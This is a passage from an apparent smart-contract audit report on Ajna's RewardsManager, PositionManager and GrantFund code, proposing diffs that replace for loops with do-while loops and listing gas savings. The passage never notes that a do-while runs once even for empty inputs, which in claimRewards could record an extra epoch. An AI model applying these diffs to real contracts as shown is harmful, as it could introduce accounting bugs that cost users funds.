class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // update exchange rates and calculate rewards if tokens were burned and within allowed time period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                for (uint256 i = 0; i &lt; indexes_.length; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     // calculate rewards earned for updating bucket exchange rate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     updatedRewards_ += _updateBucketExchangeRateAndCalculateRewards(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         pool_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -714,7 +714,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     // iterations are bounded by array length (which is itself bounded), preventing overflow / underflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                } while(i &lt; indexes_.length);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 uint256 rewardsCap            = Maths.wmul(UPDATE_CAP, totalBurned);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 uint256 rewardsClaimedInEpoch = updateRewardsClaimed[curBurnEpoch];</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L163\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L163</a></p>\n<p><em>Gas Savings for <code>RewardsManager.moveStakedLiquidity</code>, obtained via protocol’s tests: Avg 78 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>2112272</td>\n</tr>\n<tr>\n<td>After</td>\n<td>2112194</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"183\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">163</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">fromBucketLength</span><span class=\"mtk1\">; ) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"184\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..008ea99 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -160,7 +160,8 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 fromIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 toIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; fromBucketLength; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             fromIndex = fromBuckets_[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             toIndex = toBuckets_[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -182,7 +183,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // iterations are bounded by array length (which is itself bounded), preventing overflow / underflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } while (i &lt; fromBucketLength);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit MoveStakedLiquidity(tokenId_, fromBuckets_, toBuckets_);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L396\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L396</a></p>\n<p><em>Gas Savings for <code>RewardsManager.claimRewards</code>, obtained via protocol’s tests: Avg 102 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>393064</td>\n</tr>\n<tr>\n<td>After</td>\n<td>392962</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"185\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">396</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lastClaimedEpoch</span><span class=\"mtk1\">; </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">epochToClaim_</span><span class=\"mtk1\">; ) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"186\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..bf8c65a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -393,11 +393,10 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] memory positionIndexes = positionManager.getPositionIndexesFiltered(tokenId_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // iterate through all burn periods to calculate and claim rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 epoch = lastClaimedEpoch; epoch &lt; epochToClaim_; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256 nextEpochRewards = _calculateNextEpochRewards(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 tokenId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                epoch,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                lastClaimedEpoch,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 stakingEpoch,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 ajnaPool,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 positionIndexes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -405,12 +404,12 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             rewards_ += nextEpochRewards;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            unchecked { ++epoch; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            unchecked { ++lastClaimedEpoch; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // update epoch token claim trackers</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            rewardsClaimed[epoch]           += nextEpochRewards;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            isEpochClaimed[tokenId_][epoch] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            rewardsClaimed[lastClaimedEpoch]           += nextEpochRewards;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            isEpochClaimed[tokenId_][lastClaimedEpoch] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } while(lastClaimedEpoch &lt; epochToClaim_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L181-L210\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L181-L210</a></p>\n<p><em>Gas Savings for <code>PositionManager.memorializePositions</code>, obtained via protocol’s tests: Avg 134 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>1134444</td>\n</tr>\n<tr>\n<td>After</td>\n<td>1134310</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"187\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PositionManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">indexesLength</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">index</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// record bucket index at which a position has added liquidity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// slither-disable-next-line unused-return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// save position in storage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">207</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">position</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">208</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">210</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"188\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PositionManager.sol b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 261fbc1..10fee91 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -177,8 +177,9 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 indexesLength = params_.indexes.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 index;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; indexesLength; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             index = params_.indexes[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // record bucket index at which a position has added liquidity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -207,7 +208,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             positions[params_.tokenId][index] = position;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } while(i &lt; indexesLength);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // update pool LP accounting and transfer ownership of LP to PositionManager contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         pool.transferLP(owner, address(this), params_.indexes);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L364-L383\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L364-L383</a></p>\n<p><em>Gas Savings for <code>PositionManager.reedemPositions</code>, obtained via protocol’s tests: Avg 44 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>139811</td>\n</tr>\n<tr>\n<td>After</td>\n<td>139767</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"189\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PositionManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">364</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">indexesLength</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">365</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">index</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">366</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">367</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">379</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// remove LP tracked by position manager at bucket index</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">380</span><span class=\"mtk1\">:            </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">381</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">382</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">383</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"190\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PositionManager.sol b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 261fbc1..eeb4f44 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PositionManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -360,8 +360,9 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] memory lpAmounts = new uint256[](indexesLength);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 index;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; indexesLength; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             index = params_.indexes[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             Position memory position = positions[params_.tokenId][index];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -380,7 +381,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             delete positions[params_.tokenId][index];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } while(i &lt; indexesLength);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address owner = ownerOf(params_.tokenId);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L62-L65\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L62-L65</a></p>\n<p><em>Gas Savings for <code>GrantFund.executeExtraordinary</code>, obtained via protocol’s tests: Avg 47 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>95823</td>\n</tr>\n<tr>\n<td>After</td>\n<td>95776</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"191\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Funding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:            (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">returndata</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]}(</span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Address</span><span class=\"mtk1\">.</span><span class=\"mtk11\">verifyCallResult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">returndata</span><span class=\"mtk1\">, </span><span class=\"mtk12\">errorMessage</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span 